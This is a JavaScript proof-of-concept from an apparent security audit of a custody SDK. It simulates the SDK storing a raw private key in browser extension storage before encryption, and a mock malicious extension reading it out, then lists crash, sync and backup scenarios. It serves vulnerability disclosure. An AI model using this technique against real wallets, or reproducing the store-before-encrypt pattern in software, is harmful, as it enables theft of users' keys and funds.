/**
 * CRITICAL #2: Raw Private Key Storage PoC
 * @verified-network/verified-custody - Security Audit
 * 
 * Demonstrates raw (unencrypted) private key exposure during vault creation
 * No brute-force required - pure logic flaw
 */

const crypto = require('crypto');

console.log('\n' + '='.repeat(60));
console.log('  CRITICAL #2: RAW PRIVATE KEY STORAGE PoC');
console.log('  No Brute-Force Required - Pure Logic Flaw');
console.log('='.repeat(60));

console.log(`
+-------------------------------------------------------------+
|            WHY THIS IS CRITICAL                             |
+-------------------------------------------------------------+
|                                                             |
|  During vault creation, the SDK stores the RAW private      |
|  key in browser storage BEFORE encryption.                  |
|                                                             |
|  Code flow in SDK:                                          |
|                                                             |
|    1. Generate private key                                  |
|    2. await chrome.storage.local.set({ lastPk: pk });       |
|       ^ RAW PRIVATE KEY STORED HERE!                        |
|    3. ... vault creation process ...                        |
|    4. await chrome.storage.local.remove("lastPk");          |
|                                                             |
|  ATTACK WINDOW: Between steps 2 and 4                       |
|  DURATION: Can be indefinite if step 4 never completes      |
|                                                             |
+-------------------------------------------------------------+
`);

// Simulated Chrome Storage
class SimulatedChromeStorage {
    constructor() {
        this.data = {};
    }

    async set(obj) {
        Object.assign(this.data, obj);
        console.log(`  [STORAGE] Set: ${JSON.stringify(Object.keys(obj))}`);
    }

    async get(key) {
        return { [key]: this.data[key] };
    }

    async remove(key) {
        delete this.data[key];
        console.log(`  [STORAGE] Removed: ${key}`);
    }
}

const mockStorage = new SimulatedChromeStorage();

// Simulate vault creation (mimics SDK behavior)
async function simulateVaultCreation() {
    console.log('\n[VICTIM] Starting vault creation...\n');

    const privateKey = crypto.randomBytes(32).toString('hex');
    console.log(`  [SDK] Generated private key: ${privateKey.substring(0, 20)}...`);

    // VULNERABLE: SDK stores RAW private key
    await mockStorage.set({ lastPk: privateKey });
    console.log('  [SDK] WARNING: RAW private key stored in lastPk');

    console.log('\n  [WINDOW] ATTACK WINDOW OPEN');
    console.log('  ' + '='.repeat(44));

    await new Promise(resolve => setTimeout(resolve, 100));

    return privateKey;
}

// Attacker's malicious extension
async function maliciousExtensionAttack() {
    console.log('\n[ATTACKER] Malicious extension polling storage...\n');

    const result = await mockStorage.get('lastPk');

    if (result.lastPk) {
        console.log('  [ATTACKER] FOUND RAW PRIVATE KEY!');
        console.log(`  [ATTACKER] Stolen key: ${result.lastPk}`);
        return result.lastPk;
    }

    return null;
}

// Complete vault creation
async function completeVaultCreation() {
    console.log('\n  [SDK] Completing vault creation...');
    await mockStorage.remove('lastPk');
    console.log('  [SDK] lastPk removed (too late!)');
    console.log('\n  [WINDOW] ATTACK WINDOW CLOSED\n');
}

// Execute attack
async function executeAttack() {
    const originalKey = await simulateVaultCreation();
    const stolenKey = await maliciousExtensionAttack();
    await completeVaultCreation();

    console.log('[RESULT] ATTACK OUTCOME');
    console.log('='.repeat(60));
    console.log(`\n  Original Key: ${originalKey.substring(0, 30)}...`);
    console.log(`  Stolen Key:   ${stolenKey ? stolenKey.substring(0, 30) + '...' : 'FAILED'}`);
    console.log(`  Match:        ${originalKey === stolenKey ? 'YES - ATTACK SUCCESSFUL!' : 'NO'}`);

    if (originalKey === stolenKey) {
        console.log(`
+-------------------------------------------------------------+
|                    CRITICAL IMPACT                          |
+-------------------------------------------------------------+
|                                                             |
|  [X] No brute-force required                                |
|  [X] No crypto broken                                       |
|  [X] No PIN needed                                          |
|  [X] Pure logic flaw in SDK                                 |
|                                                             |
|  RESULT: Immediate private key theft                        |
|  IMPACT: Complete wallet takeover                           |
|                                                             |
|  This is a STANDALONE CRITICAL vulnerability                |
|  separate from the PIN brute-force issue.                   |
|                                                             |
+-------------------------------------------------------------+
`);
    }
}

// Additional attack scenarios
async function demonstrateAdditionalScenarios() {
    console.log('\n[SCENARIOS] ADDITIONAL ATTACK VECTORS');
    console.log('='.repeat(60));

    console.log(`
+-------------------------------------------------------------+
|              SCENARIO 1: PROCESS CRASH                      |
+-------------------------------------------------------------+
|  If confirmParticipant() never completes (crash, network    |
|  error, user closes tab), lastPk is NEVER removed.          |
|                                                             |
|  The raw private key persists indefinitely in storage.      |
+-------------------------------------------------------------+

+-------------------------------------------------------------+
|              SCENARIO 2: BROWSER SYNC                       |
+-------------------------------------------------------------+
|  Chrome syncs extension storage across devices.             |
|  lastPk may be synced to other devices before removal.      |
|                                                             |
|  Raw key could exist on multiple compromised devices.       |
+-------------------------------------------------------------+

+-------------------------------------------------------------+
|              SCENARIO 3: BACKUP EXTRACTION                  |
+-------------------------------------------------------------+
|  Browser profile backups capture storage at a point in      |
|  time. If backup occurs during attack window:               |
|                                                             |
|  Backup contains raw private key in plaintext.              |
+-------------------------------------------------------------+
`);
}

// SDK source evidence
function showSourceEvidence() {
    console.log('\n[EVIDENCE] SDK SOURCE CODE PATTERN');
    console.log('='.repeat(60));

    console.log(`
From SDK analysis, the vulnerable pattern is:

    // Found in SDK vault creation flow
    await chrome.storage.local.set({ lastPk: pk });  // RAW KEY!

    // ... co-signer confirmation process ...
    // ... network calls ...
    // ... user interaction ...

    // Only AFTER confirmation completes:
    await chrome.storage.local.remove("lastPk");

This creates a race condition window where:
- Any code with storage access can read lastPk
- No encryption protects the key during this window
- Window duration depends on external factors
`);
}

async function main() {
    await executeAttack();
    await demonstrateAdditionalScenarios();
    showSourceEvidence();

    console.log('\n[COMPLETE] PoC Finished - CRITICAL #2 Demonstrated\n');
}

main().catch(console.error);
